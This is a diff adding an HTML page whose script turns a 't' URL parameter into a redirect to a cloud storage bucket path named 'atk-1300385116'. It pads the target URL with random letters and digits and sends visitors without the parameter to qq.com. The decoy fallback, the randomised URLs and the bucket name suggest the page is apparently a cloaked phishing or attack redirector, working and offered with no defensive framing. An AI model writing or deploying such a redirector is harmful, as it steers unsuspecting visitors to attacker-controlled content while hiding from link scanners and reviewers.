@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <script>
+        function myChat(txt) {
+            return txt.replace(/\{(\w+?)\}/g, function (ind, str) {
+                var ret = '';
+                str = str.toUpperCase();
+                for (var i = 0; i < str.length; i++) {
+                    if ('N' == str[i]) {
+                        ret += Math.floor(Math.random() * 10);
+                    } else if ('D' == str[i]) {
+                        ret += String.fromCharCode(65 + Math.floor(Math.random() * 26));
+                    } else {
+                        ret += String.fromCharCode(97 + Math.floor(Math.random() * 26));
+                    }
+                }
+                return ret;
+            });
+        }
+        var $_GET = (function () {
+            var url = window.document.location.href.toString();
+            var u = url.split("?");
+            if (typeof (u[1]) == "string") {
+                u = u[1].split("&");
+                var get = {};
+                for (var i in u) {
+                    var j = u[i].split("=");
+                    get[j[0]] = j[1];
+                }
+                return get;
+            } else {
+                return {};
+            }
+        })();
+        $HOST = 'https://cos.ap-guangzhou.myqcloud.com/atk-1300385116/u/T3';
+        if ($_GET['t'] != undefined) {
+            var re = "?_w,v={www}&t=" + $_GET['t'] + "&{www}={wwwwnnn}";
+            var ret = myChat(re);
+            window.location.href = $HOST + ret;
+        } else {
+            window.location.href = "https://www.qq.com";
+        }
+
+
+    </script>
+</body>
+
+</html>
